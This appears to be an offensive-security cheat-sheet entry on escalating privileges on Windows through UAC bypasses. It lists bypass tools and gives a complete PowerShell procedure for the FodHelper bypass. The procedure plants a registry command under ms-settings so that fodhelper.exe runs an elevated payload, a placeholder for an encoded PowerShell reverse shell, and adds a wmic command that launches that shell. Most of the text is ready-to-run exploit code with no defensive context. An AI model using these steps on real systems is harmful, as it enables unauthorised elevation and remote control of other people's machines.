
### Overview
---
A compromised user may not be the Administrator user, but they may still be in the Local Administrators group.  Exploiting this requires a UAC bypass to execute commands and programs elevated.


### Exploitation Example
---
- There are an abundance of UAC bypasses; too many to cover.  Nothing is guaranteed to work, so you just have to find out what UAC bypass is possible on your compromised host.

- Example UAC Bypasses:
	- ``Invoke-EventVwrBypass`` (part of ``PowerUp.ps1``)
	- ``UACMe`` (https://github.com/hfiref0x/UACME)
	- ``FodHelper.exe`` UAC Bypass (example below)


**FodHelper UAC Bypass:**
- Requirements
```powershell
# Validate session is 64-bit
[Environment]::Is64BitProcess

# If above command returns "False", create new 64-bit session
wmic.exe process call create "powershell -nop -ex bypass -e <encoded_powershell_reverse_shell>"
```
- Exploit
```powershell
# Payload to execute
$RevShell = "powershell -nop -ex bypass -e <encoded_powershell_reverse_shell>"

# Create registry structure
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $RevShell -Force
 
# Perform the UAC bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```
